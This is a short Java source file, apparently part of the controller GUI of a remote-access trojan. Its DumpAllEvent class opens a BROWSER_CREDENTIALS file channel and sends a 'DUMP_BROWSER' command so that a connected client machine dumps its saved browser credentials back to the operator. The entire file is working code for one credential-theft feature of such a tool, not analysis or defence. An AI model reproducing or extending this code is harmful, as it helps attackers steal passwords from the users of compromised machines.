package TableUtils.Credentials.Events;

import Server.BytesChannel;
import Packets.Identificators.Category;
import TableUtils.Credentials.CredentialsManagerGUI;
import Utilities.AbstractEventGUI;
import org.json.JSONObject;

import java.io.IOException;

public class DumpAllEvent extends AbstractEventGUI<CredentialsManagerGUI> {


    public DumpAllEvent(CredentialsManagerGUI guiManager) {
        super(guiManager);
    }

    @Override
    public void run() {
        BytesChannel bytesChannel = getClient().createFileChannel(Category.BROWSER_CREDENTIALS);
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("ACTION", "DUMP_BROWSER");
        jsonObject.put("channel_id", bytesChannel.getId());
        try {
            getClient().sendString(jsonObject.toString());
        } catch (IOException e) {
            handleGuiError();
        }
    }
}
